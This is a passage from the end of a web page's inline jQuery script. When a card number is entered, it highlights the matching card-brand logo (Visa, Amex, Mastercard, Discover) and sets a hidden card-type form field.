			$("#lawla").hide(200);
			$("#visa1").hide(200);
			$("#amex1").hide(200);
			$("#mastercard1").hide(200);
			$("#discover1").show(200);
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).removeClass( "transparent" );
						document.getElementById('cardtype').value = 'Discover';
						break;

			case "AMEX":
			$("#lawla").hide(200);
			$("#visa1").hide(200);
			$("#amex1").show(200);
			$("#mastercard1").hide(200);
			$("#discover1").hide(200);
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).removeClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Amex';
						break;

			default:
			$("#lawla").show(200);
			$("#visa1").hide(200);
			$("#amex1").hide(200);
			$("#mastercard1").hide(200);
			$("#discover1").hide(200);
                break;
        }
                                      } 

		else {
           $( "#visa" ).removeClass( "transparent" );
                $( "#amex" ).removeClass( "transparent" );
                $( "#mastercard" ).removeClass( "transparent" );
                $( "#discover" ).removeClass( "transparent" );
			$("#lawla").show(200);
			$("#visa1").hide(200);
			$("#amex1").hide(200);
			$("#mastercard1").hide(200);
			$("#discover1").hide(200);
            document.getElementById('cardtype').value = '';
        }
    
    
    });	
	</script>
</body>

</html>